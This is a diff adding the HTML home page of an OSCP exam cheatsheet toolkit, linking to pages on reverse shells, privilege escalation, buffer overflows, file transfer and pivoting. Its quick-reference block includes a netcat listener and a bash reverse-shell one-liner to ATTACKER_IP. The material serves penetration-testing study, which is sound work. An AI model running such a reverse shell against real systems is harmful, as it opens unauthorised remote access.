@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OSCP Toolkit - Cheatsheets</title>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        .hero {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, #1a1f26 0%, #0d1117 100%);
+            border-radius: 16px;
+            margin-bottom: 50px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .hero h1 {
+            font-size: 2.8rem;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 40px 0;
+        }
+        
+        .card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 30px;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: block;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent-primary);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-decoration: none;
+        }
+        
+        .card-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+        
+        .card h3 {
+            color: var(--text-primary);
+            margin: 0 0 10px 0;
+            font-size: 1.3rem;
+        }
+        
+        .card p {
+            color: var(--text-secondary);
+            margin: 0;
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+        
+        .card-tags {
+            margin-top: 15px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        
+        .tag {
+            background: var(--bg-tertiary);
+            color: var(--text-muted);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            border: 1px solid var(--border-color);
+        }
+        
+        .quick-ref {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 30px;
+            margin: 40px 0;
+        }
+        
+        .quick-ref h2 {
+            margin-top: 0;
+            border: none;
+            padding: 0;
+        }
+        
+        .featured-section {
+            background: linear-gradient(135deg, rgba(88, 166, 255, 0.15) 0%, rgba(63, 185, 80, 0.15) 100%);
+            border: 2px solid var(--accent-primary);
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 40px;
+            display: grid;
+            grid-template-columns: 1fr auto;
+            gap: 30px;
+            align-items: center;
+        }
+        
+        @media (max-width: 768px) {
+            .featured-section {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .featured-content h2 {
+            margin: 0 0 10px 0;
+            color: var(--text-primary);
+            border: none;
+            padding: 0;
+        }
+        
+        .featured-content p {
+            color: var(--text-secondary);
+            margin: 0 0 15px 0;
+            font-size: 1.05rem;
+        }
+        
+        .featured-features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .featured-feature {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+        
+        .featured-feature .icon {
+            font-size: 1.2rem;
+        }
+        
+        .featured-btn {
+            background: var(--accent-primary);
+            color: var(--bg-primary);
+            padding: 15px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            white-space: nowrap;
+        }
+        
+        .featured-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(88, 166, 255, 0.4);
+            text-decoration: none;
+        }
+        
+        .setup-hint {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .setup-hint h4 {
+            margin: 0 0 10px 0;
+            color: var(--accent-green);
+        }
+        
+        .setup-hint code {
+            background: var(--bg-code);
+            padding: 3px 8px;
+            border-radius: 4px;
+        }
+        
+        .setup-hint ol {
+            margin: 10px 0 0 0;
+            padding-left: 20px;
+            color: var(--text-secondary);
+        }
+        
+        .setup-hint li {
+            margin: 8px 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>🎯 OSCP Toolkit</h1>
+            <nav>
+                <a href="index.html" class="active">Home</a>
+                <a href="quickcmds.html">⚡ Quick Cmds</a>
+                <a href="tools.html">🛠️ Tools</a>
+                <a href="reverse_shells.html">Shells</a>
+                <a href="enumeration.html">Enumeration</a>
+                <a href="privesc_linux.html">Linux PrivEsc</a>
+                <a href="privesc_windows.html">Windows PrivEsc</a>
+                <a href="buffer_overflow.html">Buffer Overflow</a>
+                <a href="transfer_files.html">File Transfer</a>
+                <a href="pivoting.html">Pivoting</a>
+                <a href="checklist.html">Checklist</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="hero">
+            <h1>🎯 OSCP Cheatsheets</h1>
+            <p>A comprehensive collection of commands, payloads, and techniques for your OSCP exam. Quick access to everything you need.</p>
+        </div>
+
+        <div class="featured-section">
+            <div class="featured-content">
+                <h2>⚡ Quick Commands → Active Terminal</h2>
+                <p>Click a command → Goes straight to your active tmux window. No session? Creates one with root shell!</p>
+                <div class="featured-features">
+                    <div class="featured-feature">
+                        <span class="icon">🎯</span>
+                        <span>Commands go to active window</span>
+                    </div>
+                    <div class="featured-feature">
+                        <span class="icon">👑</span>
+                        <span>Auto-creates root shell if needed</span>
+                    </div>
+                    <div class="featured-feature">
+                        <span class="icon">🔄</span>
+                        <span>Set IPs once, auto-substitute</span>
+                    </div>
+                    <div class="featured-feature">
+                        <span class="icon">💾</span>
+                        <span>Save custom commands</span>
+                    </div>
+                </div>
+                <div class="setup-hint">
+                    <h4>🚀 Getting Started</h4>
+                    <p style="margin: 0 0 10px 0; color: var(--text-secondary);">Double-click <strong>OSCP Toolkit</strong> on your desktop, or run:</p>
+                    <pre style="margin: 0 0 10px 0; padding: 8px 12px; background: var(--bg-code); border-radius: 4px; font-size: 0.9rem;"><code>~/OSCP-Toolkit/START</code></pre>
+                    <p style="margin: 0; font-size: 0.85rem; color: var(--text-muted);">
+                        ✓ Opens terminal with root shell<br>
+                        ✓ Opens browser to cheatsheets<br>
+                        ✓ Toggle "Send to Terminal" → click commands!<br>
+                        ✓ <code>Ctrl+B c</code> = new window, <code>Ctrl+B n</code> = next
+                    </p>
+                </div>
+            </div>
+            <a href="quickcmds.html" class="featured-btn">
+                ⚡ Open Quick Commands
+            </a>
+        </div>
+
+        <div class="cards">
+            <a href="reverse_shells.html" class="card">
+                <div class="card-icon">🐚</div>
+                <h3>Reverse Shells</h3>
+                <p>One-liners for Bash, Python, PHP, Perl, PowerShell, Netcat, and more. Plus shell upgrade techniques.</p>
+                <div class="card-tags">
+                    <span class="tag">bash</span>
+                    <span class="tag">python</span>
+                    <span class="tag">php</span>
+                    <span class="tag">powershell</span>
+                </div>
+            </a>
+
+            <a href="enumeration.html" class="card">
+                <div class="card-icon">🔍</div>
+                <h3>Enumeration</h3>
+                <p>Port scanning, service enumeration, web fuzzing, SMB, SNMP, and more reconnaissance techniques.</p>
+                <div class="card-tags">
+                    <span class="tag">nmap</span>
+                    <span class="tag">gobuster</span>
+                    <span class="tag">smb</span>
+                    <span class="tag">snmp</span>
+                </div>
+            </a>
+
+            <a href="privesc_linux.html" class="card">
+                <div class="card-icon">🐧</div>
+                <h3>Linux PrivEsc</h3>
+                <p>SUID/SGID, capabilities, sudo, cron jobs, kernel exploits, and password hunting on Linux.</p>
+                <div class="card-tags">
+                    <span class="tag">suid</span>
+                    <span class="tag">sudo</span>
+                    <span class="tag">cron</span>
+                    <span class="tag">kernel</span>
+                </div>
+            </a>
+
+            <a href="privesc_windows.html" class="card">
+                <div class="card-icon">🪟</div>
+                <h3>Windows PrivEsc</h3>
+                <p>Token privileges, service exploits, registry, scheduled tasks, and potato attacks.</p>
+                <div class="card-tags">
+                    <span class="tag">services</span>
+                    <span class="tag">registry</span>
+                    <span class="tag">potato</span>
+                    <span class="tag">mimikatz</span>
+                </div>
+            </a>
+
+            <a href="buffer_overflow.html" class="card">
+                <div class="card-icon">💥</div>
+                <h3>Buffer Overflow</h3>
+                <p>Step-by-step BOF methodology: fuzzing, offset, bad chars, JMP ESP, and shellcode generation.</p>
+                <div class="card-tags">
+                    <span class="tag">fuzzing</span>
+                    <span class="tag">eip</span>
+                    <span class="tag">mona</span>
+                    <span class="tag">shellcode</span>
+                </div>
+            </a>
+
+            <a href="transfer_files.html" class="card">
+                <div class="card-icon">📁</div>
+                <h3>File Transfer</h3>
+                <p>Methods to transfer files between attacker and target on both Windows and Linux systems.</p>
+                <div class="card-tags">
+                    <span class="tag">wget</span>
+                    <span class="tag">certutil</span>
+                    <span class="tag">smb</span>
+                    <span class="tag">base64</span>
+                </div>
+            </a>
+
+            <a href="pivoting.html" class="card">
+                <div class="card-icon">🔀</div>
+                <h3>Pivoting</h3>
+                <p>SSH tunneling, Chisel, Socat, proxychains, and techniques for accessing internal networks.</p>
+                <div class="card-tags">
+                    <span class="tag">ssh</span>
+                    <span class="tag">chisel</span>
+                    <span class="tag">socat</span>
+                    <span class="tag">socks</span>
+                </div>
+            </a>
+
+            <a href="checklist.html" class="card" style="border-color: var(--accent-green);">
+                <div class="card-icon">✅</div>
+                <h3>Attack Checklist</h3>
+                <p>Step-by-step methodology for Linux and Windows targets. Never skip a step again!</p>
+                <div class="card-tags">
+                    <span class="tag">methodology</span>
+                    <span class="tag">linux</span>
+                    <span class="tag">windows</span>
+                    <span class="tag">web</span>
+                </div>
+            </a>
+
+            <a href="quickcmds.html" class="card" style="border-color: var(--accent-primary); background: linear-gradient(135deg, rgba(88, 166, 255, 0.1) 0%, var(--bg-secondary) 100%);">
+                <div class="card-icon">⚡</div>
+                <h3>Quick Commands</h3>
+                <p>One-click buttons with terminal integration! Send commands directly to tmux or copy to clipboard.</p>
+                <div class="card-tags">
+                    <span class="tag">terminal</span>
+                    <span class="tag">tmux</span>
+                    <span class="tag">one-click</span>
+                    <span class="tag">custom</span>
+                </div>
+            </a>
+
+            <a href="tools.html" class="card" style="border-color: var(--accent-green); background: linear-gradient(135deg, rgba(63, 185, 80, 0.1) 0%, var(--bg-secondary) 100%);">
+                <div class="card-icon">🛠️</div>
+                <h3>Tool Installer</h3>
+                <p>One-click download for OSCP tools. LinPEAS, Chisel, PrintSpoofer, and more. PimpMyKali included!</p>
+                <div class="card-tags">
+                    <span class="tag">installer</span>
+                    <span class="tag">linpeas</span>
+                    <span class="tag">chisel</span>
+                    <span class="tag">pimpmykali</span>
+                </div>
+            </a>
+        </div>
+
+        <div class="quick-ref">
+            <h2>⚡ Quick Reference Commands</h2>
+            
+            <h3>Start HTTP Server</h3>
+            <pre data-lang="bash"><code>python3 -m http.server 80</code></pre>
+
+            <h3>Start Listener</h3>
+            <pre data-lang="bash"><code>nc -lvnp 4444
+rlwrap nc -lvnp 4444</code></pre>
+
+            <h3>Quick Nmap Scan</h3>
+            <pre data-lang="bash"><code>nmap -sC -sV -oA scan TARGET</code></pre>
+
+            <h3>Quick Reverse Shell</h3>
+            <pre data-lang="bash"><code>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code></pre>
+
+            <h3>Generate Password Hash</h3>
+            <pre data-lang="bash"><code>openssl passwd -1 password</code></pre>
+        </div>
+
+        <footer>
+            <p>OSCP Toolkit | Good luck on your exam! 🎯</p>
+        </footer>
+    </div>
+
+    <script>
+        document.querySelectorAll('pre').forEach(pre => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'Copy';
+            btn.onclick = () => {
+                navigator.clipboard.writeText(pre.querySelector('code').textContent);
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                    btn.classList.remove('copied');
+                }, 2000);
+            };
+            pre.style.position = 'relative';
+            pre.appendChild(btn);
+        });
+    </script>
+</body>
+</html>
+
